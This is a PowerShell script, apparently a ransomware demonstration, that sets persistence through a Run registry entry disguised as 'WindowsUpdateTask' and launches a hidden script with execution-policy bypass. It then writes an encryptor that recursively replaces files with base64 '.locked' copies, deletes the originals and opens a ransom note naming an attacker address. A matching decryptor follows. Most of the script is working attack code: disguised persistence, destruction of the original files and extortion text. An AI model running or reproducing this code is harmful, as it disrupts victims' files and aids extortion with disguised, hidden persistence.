# --- NEW: PERSISTENCE MECHANISM ---
Write-Host "[*] Establishing persistence..." -ForegroundColor Gray

# Disguising the malware as a system update task in the Registry
$RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$PayloadPath = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PWD\encrypt.ps1`""

try {
    New-ItemProperty -Path $RegistryPath -Name "WindowsUpdateTask" -Value $PayloadPath -PropertyType String -Force | Out-Null
    Write-Host "[+] Persistence established: HKCU\...\Run\WindowsUpdateTask" -ForegroundColor Cyan
} catch {
    Write-Host "[-] Failed to set persistence." -ForegroundColor Red
}

Write-Host "[*] Provisioning attack tools..." -ForegroundColor Gray

# --- 1. THE ENCRYPTOR (File-Only Mode) ---
$encCode = '
param([string]$Target = ".\", [string]$SecretKey = "AI-DEMO-2026")
$ResolvedPath = (Resolve-Path $Target).Path
$ransomNotePath = Join-Path $ResolvedPath "READ_ME_NOW.txt"

Write-Host "[!] TARGET: $ResolvedPath" -ForegroundColor Red

# Get ONLY files (-File), excluding our notes and scripts
Get-ChildItem -Path $ResolvedPath -File -Exclude "READ_ME_NOW.txt","*.locked","encrypt.ps1","decrypt.ps1","setup.ps1" -Recurse | ForEach-Object {
    try {
        $content = [System.IO.File]::ReadAllBytes($_.FullName)
        $encoded = [System.Convert]::ToBase64String($content)
        $encoded | Set-Content ($_.FullName + ".locked")
        Remove-Item $_.FullName -Force
        Write-Host "LOCKED: $($_.Name)" -ForegroundColor Yellow
    } catch {
        Write-Host "Skipping: $($_.Name) (In use or No Access)" -ForegroundColor Gray
    }
}

# The Ransom Note (Formatted for internal string use)
$note = "--- >>> ALL YOUR FILES ARE ENCRYPTED <<< ---`r`n`r`n"
$note += "Your network has been breached and all data has been encrypted.`r`n"
$note += "Your backups (Shadow Copies) have been successfully deleted.`r`n`r`n"
$note += "[ YOUR PERSONAL IDENTIFIER ]`r`n$($env:COMPUTERNAME)-1024`r`n`r`n"
$note += "[ INSTRUCTIONS ]`r`n"
$note += "1. Contact attacker@darkweb.com for payment details.`r`n"
$note += "2. Provide your Personal ID in the subject line."

$note | Set-Content $ransomNotePath
Start-Process notepad.exe $ransomNotePath
'

# --- 2. THE DECRYPTOR ---
$decCode = '
param([string]$Key, [string]$Target = ".\")
$ResolvedPath = (Resolve-Path $Target).Path

if ($Key -eq "AI-DEMO-2026") {
    Write-Host "[+] Key Validated. Scanning $ResolvedPath..." -ForegroundColor Green
    Get-ChildItem -Path $ResolvedPath -Filter *.locked -Recurse | ForEach-Object {
        try {
            $encoded = Get-Content $_.FullName -ErrorAction Stop
            $decoded = [System.Convert]::FromBase64String($encoded)
            $originalName = $_.FullName.Replace(".locked", "")
            [System.IO.File]::WriteAllBytes($originalName, $decoded)
            Remove-Item $_.FullName -Force
            Write-Host "RESTORED: $(Split-Path $originalName -Leaf)" -ForegroundColor Cyan
        } catch {
            Write-Host "[!] Error on: $($_.Name)" -ForegroundColor Red
        }
    }
} else { Write-Host "[-] ACCESS DENIED" -ForegroundColor Red }
'

# --- 3. WRITE TO DISK ---
[System.IO.File]::WriteAllText("$PWD\encrypt.ps1", $encCode)
[System.IO.File]::WriteAllText("$PWD\decrypt.ps1", $decCode)
Write-Host "[+] Tools extracted successfully." -ForegroundColor Green
